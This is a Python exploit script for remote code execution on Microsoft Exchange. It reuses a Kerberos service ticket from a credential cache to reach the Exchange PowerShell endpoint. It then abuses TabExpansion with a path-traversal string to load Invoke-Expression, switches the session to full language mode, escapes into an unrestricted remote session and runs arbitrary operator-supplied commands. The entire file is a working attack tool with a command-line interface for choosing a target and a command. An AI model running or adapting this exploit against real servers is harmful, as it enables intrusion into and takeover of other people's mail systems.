from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan
import logging
import base64
from datetime import datetime
import logging
import base64
import os
import argparse
import xml.etree.ElementTree as ET
from urllib.parse import urlparse
import urllib3
from termcolor import colored
from textwrap import dedent


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from uuid import uuid4

from impacket.krb5.types import Principal
from impacket.krb5.ccache import CCache
from impacket.krb5 import constants
from impacket.examples import logger

from pypsrp.complex_objects import Version


def load_service_ticket(spn_target_name, ccache_service_ticket_filename=None):
    TGS = None
    if ccache_service_ticket_filename is not None:
        ccache = CCache.loadFile(ccache_service_ticket_filename)
    else:
        ccache = CCache.loadFile(os.getenv("KRB5CCNAME"))
    if ccache is None:
        raise RuntimeError("Ccache loading error - check KRB5CCNAME")
    else:
        logging.debug(("Client: %s" % (ccache.credentials[0].header["client"].prettyPrint())))
        logging.debug(("Server: %s" % (ccache.credentials[0].header["server"].prettyPrint())))
        logging.debug(("Times:"))
        logging.debug(("%sAuth : %s" % ("\t\t", datetime.fromtimestamp(ccache.credentials[0].header["time"]["authtime"]).isoformat())))
        logging.debug(("%sStart: %s" % ("\t\t", datetime.fromtimestamp(ccache.credentials[0].header["time"]["starttime"]).isoformat())))
        logging.debug(("%sEnd  : %s" % ("\t\t", datetime.fromtimestamp(ccache.credentials[0].header["time"]["endtime"]).isoformat())))
        logging.debug(("%sRenew: %s" % ("\t\t", datetime.fromtimestamp(ccache.credentials[0].header["time"]["renew_till"]).isoformat())))

    domain_from_ccache = ccache.principal.realm["data"].decode("utf-8")
    logging.debug("Domain retrieved from ccache: %s", domain_from_ccache)
    creds = ccache.getCredential(spn_target_name)
    if creds is None:
        raise RuntimeError("Credentials in cache not for target SPN %s" % spn_target_name)
    else:
        # CCache provided is a TGS
        TGS = creds.toTGS()
        domain_of_tgs = domain_from_ccache
        logging.debug("Using TGS from cache for this principal: %s", spn_target_name)

    # retrieve user information from CCache file if needed
    if creds is not None:
        user = creds["client"].prettyPrint().split(b"@")[0].decode("utf-8")
        logging.debug("Username retrieved from ccache: %s" % user)
        user = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    elif len(ccache.principal.components) > 0:
        user = ccache.principal.components[0]["data"].decode("utf-8")
        user = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        logging.debug("Username retrieved from ccache: %s" % user)

    return TGS, user, domain_of_tgs


def wsman_tabshell(url, spn, command, unrestricted_session=True):
    _, user, domain_of_tgs = load_service_ticket(spn)

    username = "%s@%s" % (user, domain_of_tgs)
    logging.info("PS> Remote with user : %s" % username)
    wsman = WSMan(
        urlparse(url).netloc,
        username=username,
        password="",
        cert_validation=False,
        ssl=False,
        # proxy="http://127.0.0.1:8080",
        port=80,
        auth="kerberos",
        encryption="auto",
        negotiate_hostname_override=spn.split("/")[1],
        negotiate_service="HTTP",
        path="PowerShell",
        negotiate_send_cbt=False,
        operation_timeout=30,
        read_timeout=60,
    )

    psversion_table = {
        "PSversionTable": {
            "PSVersion": Version("5.1.17763.1490"),
            "PSEdition": "Desktop",
            "PSCompatibleVersions": [Version("1.0"), Version("2.0"), Version("3.0"), Version("4.0"), Version("5.0"), Version("5.1.17763.1490")],
            "BuildVersion": Version("10.0.17763.1490"),
            "CLRVersion": Version("4.0.30319.42000"),
            "WSManStackVersion": Version("2.0"),  # Enables TabExpansion
            "PSRemotingProtocolVersion": Version("2.3"),
            "SerializationVersion": Version("1.1.0.1"),
        }
    }

    def process(ps):
        cmd = ps.commands[0]
        cmd_args = cmd.args
        cmd_string = "%s %s" % (cmd.cmd, " ".join(["%s%s" % (x.name + ":" if x.name is not None else "", x.value) for x in cmd_args]))
        output = ps.invoke()
        stdout = "\n".join([str(s) for s in output])
        stderr = "\n".join([str(s) for s in ps.streams.error])

        logging.info(colored("PS> %s \n%s" % (cmd_string, stdout), "green"))
        logging.error(colored("PS [ERROR]>\n%s" % stderr, "red"))

    with RunspacePool(wsman, configuration_name="Microsoft.Exchange", application_arguments=psversion_table) as pool:
        ps = PowerShell(pool)

        invoke_expression_dll = ";../../../../Windows/Microsoft.NET/assembly/GAC_MSIL/Microsoft.PowerShell.Commands.Utility/v4.0_3.0.0.0__31bf3856ad364e35/Microsoft.PowerShell.Commands.Utility.dll\Invoke-Expression"

        logging.info(colored("Loading Invoke-Expression (Microsoft.PowerShell.Commands.Management.dll) \n", "blue"))
        ps = PowerShell(pool)
        ps.add_cmdlet("TabExpansion").add_parameter("lastWord", "-test").add_parameter("line", invoke_expression_dll)
        process(ps)

        logging.info(colored("Switching to Full LanguageMode", "blue"))
        ps = PowerShell(pool)
        ps.add_cmdlet("Invoke-Expression").add_argument("\"`$ExecutionContext.SessionState.LanguageMode='FullLanguage'\"")
        process(ps)

        if unrestricted_session:
            logging.info(colored("Switching to an unrestricted PSSession", "blue"))
            ps = PowerShell(pool)
            ps.add_cmdlet("Invoke-Expression").add_argument("$s=New-PSSession;")
            process(ps)

            iex_arg = f"Invoke-Command -Session $s -ScriptBlock {{ {command} }} | foreach-object {{ $_.ToString() }}"
        else:
            iex_arg = f"{command}"
        logging.info(colored("Processing command", "blue"))
        ps = PowerShell(pool)
        ps.add_cmdlet("Invoke-Expression").add_argument(iex_arg)
        process(ps)


if __name__ == "__main__":
    # Parsing command line arguments
    parser = argparse.ArgumentParser(description="full chain exchange proxyshell rce with kerberos auth")

    parser.add_argument("-spn", required=True, help="Use the provided SPN when an SPN is needed. More details in the article.")
    parser.add_argument("-url", required=True, help="Target url.")
    parser.add_argument("-st", help="CCache with service ticket. (or prepend env var KRB5CCNAME)")
    parser.add_argument("-d", action="store_true", default=False, help="Debug")
    parser.add_argument("-s", action="store_true", default=False, help="Silent")
    parser.add_argument("-cmd", action="store", default="Get-LocalUser", help="Command")
    parser.add_argument("-low", action="store_false", default=True, help="Keep a restricted session (Exchange)")

    args = parser.parse_args()

    logger.init(ts=False)
    if args.s:
        logging.getLogger().setLevel(logging.ERROR)
    elif args.d:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    proxies = {"192.168.57.1": "8080"}

    mail_subject = "%s" % uuid4()

    try:
        wsman_tabshell(args.url, args.spn, args.cmd, args.low)
    except Exception as e:
        raise e
